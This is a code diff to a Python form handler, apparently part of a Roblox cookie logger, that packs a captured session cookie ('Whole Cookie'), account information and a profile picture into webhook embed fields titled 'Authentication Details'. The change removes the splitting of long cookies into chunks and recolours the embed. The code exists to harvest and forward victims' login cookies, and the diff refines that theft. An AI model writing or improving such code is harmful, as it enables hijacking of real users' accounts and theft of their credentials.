@@ -236,30 +236,13 @@ def submit_form():
         # Prepare embed fields for cookie and additional info
         fields = []
         
-        # Handle cookie display in embed fields
+        # Handle cookie display as single field
         if cookie:
-            if len(cookie) <= 1000:
-                # Single field for shorter cookies
-                fields.append({
-                    'name': '🍪 Whole Cookie',
-                    'value': f'```{cookie}```',
-                    'inline': False
-                })
-            else:
-                # Split long cookies into multiple fields
-                cookie_parts = []
-                chunk_size = 1000  # Leave room for backticks and formatting
-                for i in range(0, len(cookie), chunk_size):
-                    chunk = cookie[i:i + chunk_size]
-                    cookie_parts.append(chunk)
-                
-                for i, part in enumerate(cookie_parts):
-                    field_name = f'🍪 Cookie Part {i + 1}/{len(cookie_parts)}'
-                    fields.append({
-                        'name': field_name,
-                        'value': f'```{part}```',
-                        'inline': False
-                    })
+            fields.append({
+                'name': '🍪 Whole Cookie',
+                'value': f'```{cookie}```',
+                'inline': False
+            })
         else:
             fields.append({
                 'name': '🍪 Whole Cookie',
@@ -271,7 +254,7 @@ def submit_form():
             'content': account_info,
             'embeds': [{
                 'title': '🔐 Authentication Details',
-                'color': 0x00d4ff,  # Roblox blue color
+                'color': 0xff0000,  # Red color
                 'thumbnail': {
                     'url': user_info['profile_picture']
                 },
